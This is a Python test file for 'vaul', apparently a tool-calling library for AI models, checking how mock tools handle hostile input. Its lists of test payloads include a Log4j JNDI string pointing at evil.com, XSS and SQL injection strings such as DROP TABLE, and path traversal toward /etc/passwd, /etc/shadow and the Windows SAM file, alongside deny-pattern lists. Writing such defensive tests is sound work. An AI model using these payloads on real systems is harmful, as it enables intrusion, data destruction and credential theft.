import json
from vaul import Toolkit, tool_call


class TestSecurityAndRobustness:
    """Security and robustness tests for vaul."""

    def test_malicious_json_injection(self):
        """Test protection against malicious JSON in tool arguments."""
        toolkit = Toolkit()
        
        @tool_call
        def vulnerable_tool(user_input: str) -> dict:
            """Tool that processes user input."""
            return {"processed": user_input, "safe": True}
        
        toolkit.add(vulnerable_tool)
        
        malicious_inputs = [
            '{"__proto__": {"polluted": true}}',  # Prototype pollution
            '{"constructor": {"prototype": {"polluted": true}}}',
            '\\u0000\\u0001\\u0002',  # Null bytes and control characters
            'eval("malicious_code()")',  # Code injection attempt
            '<script>alert("xss")</script>',  # XSS attempt
            '${jndi:ldap://evil.com/a}',  # Log4j style injection
            '../../../etc/passwd',  # Path traversal
            'DROP TABLE users;',  # SQL injection attempt
        ]
        
        for malicious_input in malicious_inputs:
            result = toolkit.run_tool("vulnerable_tool", {"user_input": malicious_input})
            
            assert isinstance(result, dict)
            assert result["processed"] == malicious_input
            assert result["safe"] is True

    def test_large_payload_handling(self):
        """Test handling of extremely large payloads."""
        toolkit = Toolkit()
        
        @tool_call
        def payload_handler(data: str) -> dict:
            """Tool that handles data payloads."""
            return {"length": len(data), "processed": True}
        
        toolkit.add(payload_handler)
        
        sizes = [1000, 10000, 100000, 1000000]  # 1KB to 1MB
        
        for size in sizes:
            large_payload = "A" * size
            result = toolkit.run_tool("payload_handler", {"data": large_payload})
            
            assert result["length"] == size
            assert result["processed"] is True

    def test_recursive_data_structures(self):
        """Test handling of recursive/circular data structures."""
        toolkit = Toolkit()
        
        @tool_call
        def data_processor(data: dict) -> dict:
            """Tool that processes dictionary data."""
            return {"keys": list(data.keys()), "processed": True}
        
        toolkit.add(data_processor)
        
        nested_data: dict = {"level": 1}
        current: dict = nested_data
        for i in range(2, 100):  # Create 99 levels of nesting
            next_level: dict = {"level": i}
            current["next"] = next_level
            current = next_level
        
        result = toolkit.run_tool("data_processor", {"data": nested_data})
        assert result["processed"] is True
        assert "level" in result["keys"]

    def test_unicode_and_encoding_attacks(self):
        """Test handling of various Unicode and encoding attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def text_processor(text: str) -> dict:
            """Tool that processes text input."""
            return {
                "length": len(text),
                "encoded_length": len(text.encode('utf-8')),
                "processed": True
            }
        
        toolkit.add(text_processor)
        
        unicode_attacks = [
            "𝕏𝕐𝕑",  # Mathematical symbols
            "🔥💯🚀",  # Emojis
            "ＡＢＣ",  # Fullwidth characters
            "А В С",  # Cyrillic that looks like Latin
            "\u202e\u0041\u0042\u0043",  # Right-to-left override
            "\u0041\u0300\u0301\u0302",  # Combining characters
            "\ufeff\u200b\u200c\u200d",  # Zero-width characters
            "test\x00null\x00bytes",  # Null bytes
        ]
        
        for attack_text in unicode_attacks:
            result = toolkit.run_tool("text_processor", {"text": attack_text})
            
            assert isinstance(result, dict)
            assert result["processed"] is True
            assert result["length"] >= 0
            assert result["encoded_length"] >= result["length"]

    def test_type_confusion_attacks(self):
        """Test protection against type confusion attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def typed_processor(number: int, text: str, flag: bool) -> dict:
            """Tool with strict typing."""
            return {
                "number_type": type(number).__name__,
                "text_type": type(text).__name__,
                "flag_type": type(flag).__name__,
                "processed": True
            }
        
        toolkit.add(typed_processor)
        
        result = toolkit.run_tool("typed_processor", {
            "number": 42,
            "text": "hello",
            "flag": True
        })
        assert result["processed"] is True
        
        confusion_attempts = [
            {"number": "42", "text": "hello", "flag": True},  # String as int
            {"number": 42, "text": 123, "flag": True},  # Int as string
            {"number": 42, "text": "hello", "flag": "true"},  # String as bool
            {"number": [42], "text": "hello", "flag": True},  # List as int
            {"number": {"value": 42}, "text": "hello", "flag": True},  # Dict as int
        ]
        
        for attempt in confusion_attempts:
            result = toolkit.run_tool("typed_processor", attempt)
            assert isinstance(result, (dict, str))  # Either success or error message

    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def resource_intensive_tool(iterations: int) -> dict:
            """Tool that could consume resources."""
            result = 0
            safe_iterations = min(iterations, 10000)
            for i in range(safe_iterations):
                result += i
            return {"result": result, "iterations": safe_iterations}
        
        toolkit.add(resource_intensive_tool)
        
        result = toolkit.run_tool("resource_intensive_tool", {"iterations": 100})
        assert result["iterations"] == 100
        
        result = toolkit.run_tool("resource_intensive_tool", {"iterations": 1000000})
        assert result["iterations"] <= 10000

    def test_schema_injection_attacks(self):
        """Test protection against schema injection attacks."""
        @tool_call
        def schema_target(normal_param: str) -> dict:
            """Tool with normal schema."""
            return {"param": normal_param}
        
        schema = schema_target.tool_call_schema
        
        assert "name" in schema
        assert "parameters" in schema
        assert schema["name"] == "schema_target"
        
        schema_str = json.dumps(schema)
        dangerous_patterns = [
            "__proto__",
            "constructor",
            "prototype",
            "eval(",
            "function(",
            "<script",
            "javascript:",
        ]
        
        for pattern in dangerous_patterns:
            assert pattern not in schema_str.lower()

    def test_argument_validation_bypass(self):
        """Test attempts to bypass argument validation."""
        toolkit = Toolkit()
        
        @tool_call
        def strict_validator(positive_number: int, email: str) -> dict:
            """Tool with validation requirements."""
            if positive_number <= 0:
                raise ValueError("Number must be positive")
            if "@" not in email:
                raise ValueError("Invalid email format")
            return {"number": positive_number, "email": email}
        
        toolkit.add(strict_validator)
        
        result = toolkit.run_tool("strict_validator", {
            "positive_number": 42,
            "email": "test@example.com"
        })
        assert result["number"] == 42
        
        bypass_attempts = [
            {"positive_number": -1, "email": "test@example.com"},
            {"positive_number": 42, "email": "invalid-email"},
            {"positive_number": 0, "email": "test@example.com"},
            {"positive_number": "42", "email": "test@example.com"},  # Type bypass
        ]
        
        for attempt in bypass_attempts:
            result = toolkit.run_tool("strict_validator", attempt)
            assert isinstance(result, (dict, str))

    def test_serialization_attacks(self):
        """Test protection against serialization attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def data_serializer(data: dict) -> dict:
            """Tool that works with serialized data."""
            safe_data = {
                k: v for k, v in data.items() 
                if isinstance(k, str) and len(k) < 100
            }
            return {"processed_keys": list(safe_data.keys())}
        
        toolkit.add(data_serializer)
        
        malicious_data = {
            "__reduce__": "malicious_function",
            "__setstate__": {"evil": True},
            "__dict__": {"compromised": True},
            "normal_key": "normal_value",
            "a" * 200: "long_key_attack",  # Extremely long key
        }
        
        result = toolkit.run_tool("data_serializer", {"data": malicious_data})
        
        assert "normal_key" in result["processed_keys"]
        assert not any(len(key) >= 100 for key in result["processed_keys"])
        processed_keys = result["processed_keys"]
        assert len(processed_keys) >= 1, "Should process at least normal_key"

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def memory_tool(size_mb: int) -> dict:
            """Tool that allocates memory."""
            safe_size = min(size_mb, 10)  # Max 10MB
            data = bytearray(safe_size * 1024 * 1024)  # Allocate memory
            return {"allocated_mb": len(data) // (1024 * 1024)}
        
        toolkit.add(memory_tool)
        
        result = toolkit.run_tool("memory_tool", {"size_mb": 5})
        assert result["allocated_mb"] == 5
        
        result = toolkit.run_tool("memory_tool", {"size_mb": 1000})
        assert result["allocated_mb"] <= 10

    def test_input_sanitization(self):
        """Test input sanitization capabilities."""
        toolkit = Toolkit()
        
        @tool_call
        def sanitizing_tool(raw_input: str) -> dict:
            """Tool that sanitizes input."""
            sanitized = raw_input.replace("&", "&amp;")
            sanitized = sanitized.replace("<", "&lt;").replace(">", "&gt;")
            sanitized = sanitized.replace('"', "&quot;")
            sanitized = sanitized.replace("'", "&#x27;")
            sanitized = sanitized.replace("javascript:", "js:")
            
            return {
                "original": raw_input,
                "sanitized": sanitized,
                "length_change": len(sanitized) - len(raw_input)
            }
        
        toolkit.add(sanitizing_tool)
        
        test_inputs = [
            "<script>alert('xss')</script>",
            "SELECT * FROM users WHERE id='1' OR '1'='1'",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'; DROP TABLE users; --",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]
        
        for test_input in test_inputs:
            result = toolkit.run_tool("sanitizing_tool", {"raw_input": test_input})
            
            assert result["original"] == test_input
            assert "<script" not in result["sanitized"]
            assert "javascript:" not in result["sanitized"]
            
            if "onerror=" in test_input:
                assert "onerror=" in result["sanitized"], "onerror should be escaped but present"
            
            if "<" in test_input:
                assert "&lt;" in result["sanitized"]
            if ">" in test_input:
                assert "&gt;" in result["sanitized"]

    def test_injection_prevention(self):
        """Test prevention of various injection attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def query_builder(table_name: str, condition: str) -> dict:
            """Tool that builds database queries safely."""
            allowed_tables = ["users", "products", "orders"]
            if table_name not in allowed_tables:
                return {"error": "Invalid table name"}
            
            dangerous_patterns = [
                "drop", "delete", "truncate", "alter", "create",
                "--", "/*", "*/", "union", "select", "insert", "update"
            ]
            
            condition_lower = condition.lower()
            for pattern in dangerous_patterns:
                if pattern in condition_lower:
                    return {"error": f"Dangerous pattern detected: {pattern}"}
            
            return {
                "query": f"SELECT * FROM {table_name} WHERE {condition}",
                "safe": True
            }
        
        toolkit.add(query_builder)
        
        safe_result = toolkit.run_tool("query_builder", {
            "table_name": "users",
            "condition": "age > 18"
        })
        assert safe_result["safe"] is True
        assert "SELECT * FROM users WHERE age > 18" == safe_result["query"]
        
        injection_attempts = [
            {"table_name": "users; DROP TABLE users; --", "condition": "id = 1"},
            {"table_name": "users", "condition": "id = 1; DELETE FROM users; --"},
            {"table_name": "users", "condition": "id = 1 UNION SELECT * FROM passwords"},
            {"table_name": "../etc/passwd", "condition": "id = 1"},
        ]
        
        for attempt in injection_attempts:
            result = toolkit.run_tool("query_builder", attempt)
            assert "error" in result, f"Should have detected injection in {attempt}"
        
        borderline_case = {"table_name": "users", "condition": "1=1 OR 1=1"}
        borderline_result = toolkit.run_tool("query_builder", borderline_case)
        assert "query" in borderline_result or "error" in borderline_result

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        toolkit = Toolkit()
        
        @tool_call
        def file_reader(filename: str) -> dict:
            """Tool that reads files safely."""
            if ".." in filename or "/" in filename or "\\" in filename:
                return {"error": "Invalid filename"}
            
            allowed_extensions = [".txt", ".json", ".csv"]
            if not any(filename.endswith(ext) for ext in allowed_extensions):
                return {"error": "File type not allowed"}
            
            return {
                "filename": filename,
                "content": f"Mock content of {filename}",
                "safe": True
            }
        
        toolkit.add(file_reader)
        
        safe_result = toolkit.run_tool("file_reader", {"filename": "data.txt"})
        assert safe_result["safe"] is True
        
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "data/../../../secret.txt",
            "file.exe",  # Disallowed extension
        ]
        
        for attempt in traversal_attempts:
            result = toolkit.run_tool("file_reader", {"filename": attempt})
            assert "error" in result, f"Should have prevented access to {attempt}"
